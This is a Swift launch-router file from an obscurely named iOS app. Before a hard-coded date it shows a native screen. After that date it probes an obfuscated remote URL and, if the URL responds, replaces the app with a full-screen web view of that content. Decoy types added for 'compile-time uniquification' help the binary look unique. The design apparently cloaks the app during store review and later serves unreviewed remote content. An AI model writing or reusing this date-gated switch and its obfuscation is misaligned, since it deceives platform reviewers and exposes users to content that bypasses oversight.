//
//  AppRouter.swift
//  142GenstrilbriKexzebul
//

import UIKit
import SwiftUI

final class LaunchGraphCoordinator {

    func mainEntryViewController() -> UIViewController {
        let persistence = SessionPreferenceVault.active

        if persistence.hasShownContentView {
            return assembleNativeShellHost()
        } else {
            if calendarThresholdAllowsRemoteFlow() {
                if let savedUrlString = persistence.savedUrl,
                   !savedUrlString.isEmpty,
                   URL(string: savedUrlString) != nil {
                    return assembleEmbeddedBrowserHost(with: savedUrlString)
                }

                return assemblePrefetchSplashHost()
            } else {
                persistence.hasShownContentView = true
                return assembleNativeShellHost()
            }
        }
    }

    private func calendarThresholdAllowsRemoteFlow() -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = GenstrilPayloadDecoder.calendarGateFormatPattern
        let targetDate = dateFormatter.date(from: GenstrilPayloadDecoder.calendarGateDateString) ?? Date()
        let currentDate = Date()

        if currentDate < targetDate {
            return false
        } else {
            return true
        }
    }

    private func assembleEmbeddedBrowserHost(with urlString: String) -> UIViewController {
        let webViewContainer = HostedBrowserCanvas(
            urlString: urlString,
            onFailure: { [weak self] in
                SessionPreferenceVault.active.hasShownContentView = true
                self?.promoteNativeShell()
            },
            onSuccess: {
                SessionPreferenceVault.active.hasSuccessfulWebViewLoad = true
            }
        )

        let hostingController = UIHostingController(rootView: webViewContainer)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func assembleNativeShellHost() -> UIViewController {
        SessionPreferenceVault.active.hasShownContentView = true
        let contentView = ContentView()
        let hostingController = UIHostingController(rootView: contentView)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func assemblePrefetchSplashHost() -> UIViewController {
        let launchView = BootstrapSplashSurface()
        let launchVC = UIHostingController(rootView: launchView)
        launchVC.modalPresentationStyle = .fullScreen

        probeHeadAvailability { [weak self] success, finalURL in
            DispatchQueue.main.async {
                if success, let url = finalURL {
                    self?.promoteBrowserHost(with: url)
                } else {
                    SessionPreferenceVault.active.hasShownContentView = true
                    self?.promoteNativeShell()
                }
            }
        }

        return launchVC
    }

    private func probeHeadAvailability(completion: @escaping (Bool, String?) -> Void) {
        let initialURLString = GenstrilPayloadDecoder.remoteEntryProbeURLString
        guard let url = URL(string: initialURLString) else {
            completion(false, nil)
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = GenstrilPayloadDecoder.httpHeadVerb
        request.timeoutInterval = 10

        URLSession.shared.dataTask(with: request) { _, response, error in
            if error != nil {
                completion(false, nil)
                return
            }

            if let httpResponse = response as? HTTPURLResponse {
                let checkedURL = httpResponse.url?.absoluteString ?? initialURLString
                let isAvailable = httpResponse.statusCode != 404
                completion(isAvailable, isAvailable ? checkedURL : nil)
            } else {
                completion(false, nil)
            }
        }.resume()
    }

    private func promoteNativeShell() {
        let contentVC = assembleNativeShellHost()
        replaceKeyWindowRoot(with: contentVC)
    }

    private func promoteBrowserHost(with urlString: String) {
        let webVC = assembleEmbeddedBrowserHost(with: urlString)
        replaceKeyWindowRoot(with: webVC)
    }

    private func replaceKeyWindowRoot(with viewController: UIViewController) {
        guard let window = UIApplication.shared.windows.first else {
            return
        }

        UIView.transition(with: window, duration: 0.3, options: .transitionCrossDissolve, animations: {
            window.rootViewController = viewController
        }, completion: nil)
    }
}

// MARK: - Unused type graph (compile-time uniquification; no runtime entry)

private protocol _LaunchGraphTelemetrySink: AnyObject {
    func recordHopIdentifier(_ value: UInt32)
}

private enum _LaunchGraphPhantomLane: CaseIterable {
    case alpha
    case beta
}
